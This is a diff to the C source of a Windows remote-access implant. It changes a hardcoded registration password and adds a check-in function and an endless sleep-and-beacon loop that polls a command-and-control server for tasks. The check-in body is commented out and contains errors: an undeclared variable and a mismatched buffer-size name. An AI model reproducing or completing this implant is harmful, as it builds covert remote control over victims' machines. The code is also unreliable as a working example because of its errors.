@@ -151,7 +151,7 @@ int RegisterSelf() {
 
 	ri.Hostname = "test" ;
 	ri.Username = "userwoozer";
-	ri.Password = "pass";
+	ri.Password = "SUPER_COMPLEX_PASSWORD_WOWZA!!!";
 
 	size_t bufferSize = 0;
 	BYTE *registerBuffer = EncodeRegisterImplant(&ri, &bufferSize);
@@ -161,6 +161,50 @@ int RegisterSelf() {
         }
 	
 	return 1;
+}
+
+/**
+message ImplantCheckin {
+  string GUID = 1;
+  TaskResponse Resp = 2;
+}
+**/
+// Check-in with Server
+BOOL DoCheckin(TaskResponse *tResp, TaskRequest *tReq) {
+	/**
+	ImplantCheckin ic = ImplantCheckin_init_zero;
+	ic.GUID = (char *)ImplantID;
+	ic.Resp = *tResp;
+	chk.has_Resp = true;
+	size_t icBufferSize = 0;
+	BYTE *checkinBuffer = EncodeImplantCheckin(&ic, &icBufferSize);
+	
+	if (checkinBuffer == NULL) {
+		return FALSE;
+	}
+	
+	size_t out_size = 0;
+	
+	LPBYTE result = HTTPRequest(L"POST", C2_HOST, CHECKIN_PATH, C2_PORT, C2_UA,
+                              checkinBuffer, stBuffSize, &out_size, USE_TLS);
+	
+	FreeTaskResponse(tResp);
+	free(checkinBuffer);
+	
+	if (result != NULL && out_size > 0) {
+		BOOL status = DecodeTaskRequest(result, out_size, tReq);
+		free(result);
+		if (status && tReq->TaskGuid == NULL) {
+			// No task to perform, null out the TaskResponse
+			memset(tResp, 0, sizeof(TaskResponse));
+		}
+		return status;
+	}
+	
+	if (result) {
+		free(result);
+	}**/
+	return FALSE;
 }
 
 
@@ -174,6 +218,26 @@ int main() {
 	}
 	printf("[+] Successfully registered Implant with Server!\n");
 
+	TaskRequest tReq = TaskRequest_init_zero;
+	TaskResponse tResp = TaskResponse_init_zero;
+	
+	while (1) {
+		DEBUG_PRINTF("[+] Sleeping for %d milliseconds \n", SLEEP_TIME);
+		Sleep(SLEEP_TIME);
+		
+		BOOL checkinResult = DoCheckin(&tResp, &tReq);
+		
+		if (checkinResult && tReq.TaskGuid != NULL) {
+			DEBUG_PRINTF("[+] NEW TASK RECIEVED.\n");
+			// HandleOpcode(&tReq, &tResp);
+		} else {
+			// No task to perform, null out the TaskResponse
+			memset(&tResp, 0, sizeof(TaskResponse));
+		}
+	}
+	
+	// Free the final task response before exiting
+	// FreeTaskResponse(&tResp);
 	return 0;
 }
 
